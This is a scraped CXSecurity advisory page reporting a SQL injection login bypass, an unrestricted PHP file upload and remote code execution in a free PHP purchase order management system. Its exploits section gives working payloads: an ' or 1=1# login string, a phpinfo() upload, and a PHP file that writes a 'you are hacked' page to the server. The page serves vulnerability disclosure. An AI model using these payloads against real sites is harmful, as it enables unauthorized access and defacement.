---
title: POMS-PHP-(by oretnom23 )-v1.0-FU-SQLi-RCE-HAT.TRICK
url: https://cxsecurity.com/issue/WLB-2024050021
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-05-08
fetch_date: 2025-10-06T17:15:18.370861
---

# POMS-PHP-(by oretnom23 )-v1.0-FU-SQLi-RCE-HAT.TRICK

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **POMS-PHP-(by oretnom23 )-v1.0-FU-SQLi-RCE-HAT.TRICK** **2024.05.07**  **![bg](https://cert.cx/cxstatic/images/flags/bg.png) [nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/) **(BG)** ![bg](https://cert.cx/cxstatic/images/flags/bg.png)**  Risk: **High**  Local: ****Yes****  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

## Titles: POMS-PHP-(by oretnom23 )-v1.0-FU-SQLi-RCE-HAT.TRICK
1. SQLi Bypass Authentication
2. File Upload
3. RCE
## Latest update from the vendor: 5 hours 32 minutes ago
## Author: nu11secur1ty
## Date: 05/07/2024
## Vendor: https://github.com/oretnom23
## Software: https://www.sourcecodester.com/php/14935/purchase-order-management-system-using-php-free-source-code.html
## Reference: https://portswigger.net/web-security/sql-injection, https://portswigger.net/web-security/file-upload, https://portswigger.net/web-security/authentication
## Description:
SQLi-Bypass-Authentication:
The username parameter is not sanitizing well, the attacker can bypass authentication and login to the system.
---------------------------------------------------------------------------------------------------------------------------------------
FU:
Using this vulnerability, the attacker can upload any PHP file on the server.
The parameter id="cimg" is not sanitizing securely.
STATUS: CRITICAL- Vulnerability
---------------------------------------------------------------------------------------------------------------------------------------
RCE:
The attacker can upload a malicious file with hazardous content. Then he can use it to create another file on the server.
STATUS: CRITICAL- Vulnerability
[+]Exploits:
- SQLi bypass authentication:
```mysql
nu11secur1ty' or 1=1#
```
- FU:
```
<?php
phpinfo();
?>
```
- SQLi - Bypass-Authentication:
```
<?php
// by nu11secur1ty - 2023
$fh = fopen('test.html', 'a');
fwrite($fh, '<h1>Hello, you are hacked by Fileupload and RCE!</h1>');
fclose($fh);
//unlink('test.html');
?>
```
## Reproduce:
[href](https://www.patreon.com/posts/poms-php-by-v1-0-103786653)
## Proof and Exploit:
[href](https://www.nu11secur1ty.com/2024/05/poms-php-by-oretnom23-v10-fu-sqli-rce.html)
## Time spent:
00:35:00
--
System Administrator - Infrastructure Engineer
Penetration Testing Engineer
Exploit developer at https://packetstormsecurity.com/ https://cve.mitre.org/index.html
https://cxsecurity.com/ and https://www.exploit-db.com/
0day Exploit DataBase https://0day.today/
home page: https://www.nu11secur1ty.com/
hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E=
nu11secur1ty <http://nu11secur1ty.com/>

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024050021)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top